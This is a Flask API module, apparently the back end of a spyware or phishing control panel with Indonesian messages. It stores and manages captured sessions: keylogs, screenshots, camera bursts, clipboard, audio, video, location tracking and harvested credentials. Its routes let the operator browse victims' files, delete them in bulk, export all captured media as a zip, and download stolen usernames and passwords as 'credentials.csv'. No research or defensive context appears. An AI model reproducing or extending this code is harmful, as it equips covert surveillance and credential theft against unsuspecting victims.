from flask import Blueprint, jsonify, send_file, send_from_directory
from app.auth import login_required
from app.config import Config
from app.models import Session as SessionModel, Event, BurstPhoto, Keylog, Credential
from app.database import db
import os, io, zipfile, csv

bp = Blueprint("api", __name__)

FOLDERS = ["UPLOAD_DIR", "SCREENSHOT_DIR", "BURST_DIR", "KEYS_DIR",
           "CLIPBOARD_DIR", "AUDIO_DIR", "VIDEO_DIR", "TRACKING_DIR"]


def _all_folders():
    return [getattr(Config, k) for k in FOLDERS]


@bp.route("/delete/<ts>", methods=["POST", "DELETE"])
@login_required
def delete_session(ts):
    for folder in _all_folders():
        if os.path.isdir(folder):
            for f in os.listdir(folder):
                if f.startswith(ts):
                    try: os.remove(os.path.join(folder, f))
                    except: pass
    SessionModel.query.filter_by(ts=ts).delete()
    Event.query.filter_by(session_ts=ts).delete()
    BurstPhoto.query.filter_by(session_ts=ts).delete()
    Keylog.query.filter_by(session_ts=ts).delete()
    Credential.query.filter_by(session_ts=ts).delete()
    db.session.commit()
    return jsonify({"ok": True, "msg": "Sesi dihapus"})


@bp.route("/delete-all", methods=["POST", "DELETE"])
@login_required
def delete_all():
    count = SessionModel.query.count()
    for folder in _all_folders():
        if os.path.isdir(folder):
            for f in os.listdir(folder):
                try: os.remove(os.path.join(folder, f))
                except: pass
    SessionModel.query.delete()
    Event.query.delete()
    BurstPhoto.query.delete()
    Keylog.query.delete()
    Credential.query.delete()
    db.session.commit()
    return jsonify({"ok": True, "msg": str(count) + " sesi dihapus"})


@bp.route("/file/<path:fname>")
@login_required
def get_file(fname):
    for folder in _all_folders():
        if os.path.isfile(os.path.join(folder, fname)):
            return send_from_directory(folder, fname)
    return jsonify({"ok": False}), 404


@bp.route("/session/<ts>")
@login_required
def session_detail(ts):
    s = SessionModel.query.filter_by(ts=ts).first()
    if not s:
        return jsonify({"ok": False}), 404
    d = s.to_dict()
    d["event_count"] = Event.query.filter_by(session_ts=ts).count()
    d["burst_count"] = BurstPhoto.query.filter_by(session_ts=ts).count()
    d["key_count"] = Keylog.query.filter_by(session_ts=ts).count()
    d["cred_count"] = Credential.query.filter_by(session_ts=ts).count()
    return jsonify({"ok": True, "data": d})


@bp.route("/export/zip")
@login_required
def export_zip():
    mem = io.BytesIO()
    with zipfile.ZipFile(mem, "w", zipfile.ZIP_DEFLATED) as z:
        for k in FOLDERS:
            folder = getattr(Config, k)
            folder_name = k.replace("_DIR", "").lower()
            if os.path.isdir(folder):
                for f in os.listdir(folder):
                    fp = os.path.join(folder, f)
                    if os.path.isfile(fp):
                        z.write(fp, arcname=folder_name + "/" + f)
        rows = SessionModel.query.all()
        import json as _j
        z.writestr("sessions.json", _j.dumps([r.to_dict() for r in rows], indent=2, default=str))
    mem.seek(0)
    return send_file(mem, mimetype="application/zip", as_attachment=True, download_name="capture_export.zip")


@bp.route("/export/creds")
@login_required
def export_creds():
    rows = Credential.query.order_by(Credential.id.desc()).all()
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["ts", "username", "password", "source", "created_at"])
    for r in rows:
        w.writerow([r.session_ts, r.username, r.password, r.source, r.created_at])
    mem = io.BytesIO(buf.getvalue().encode("utf-8"))
    return send_file(mem, mimetype="text/csv", as_attachment=True, download_name="credentials.csv")
